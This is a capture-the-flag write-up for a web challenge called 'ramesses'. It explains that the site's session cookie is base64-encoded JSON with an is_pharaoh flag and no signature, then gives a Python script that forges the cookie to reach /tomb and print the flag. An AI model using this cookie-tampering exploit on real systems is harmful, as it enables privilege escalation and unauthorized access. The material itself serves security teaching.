## Analysis
On browsing the homepage, we're presented with the following form:

![homepage.png](homepage.png)

From the source code, when one logs in, a session cookie is set up with the attributes of name (provided in the form) and is_pharaoh, set to False. This is then base64 decoded and returned to the client as a cookie.

Because it is not encrypted or signed in any way, it can be modified trivially in the client.

```python
from http import *
from http.client import *
from pwn import *
import json


conn = HTTPSConnection("ramesses.challs.pwnoh.io")
conn.request("POST", "/", "name=test&password=test", headers={"Content-Type": "x-www-form-urlencoded"})
response = conn.getresponse()
cookie = response.headers.get("Set-Cookie")

cookie = json.loads(b64d(cookie.split(";")[0].split("=")[1]))
cookie["is_pharaoh"] = True

newCookie = json.dumps(cookie)

conn.request("GET", "/tomb", headers={
    "Cookie": "session=" + b64e(newCookie.encode())
})
response.close()
response = conn.getresponse()

resp = response.read()

resp = resp[resp.index(b"bctf{"):]
resp = resp[:resp.index(b"}")+1]

print(resp.decode())
```
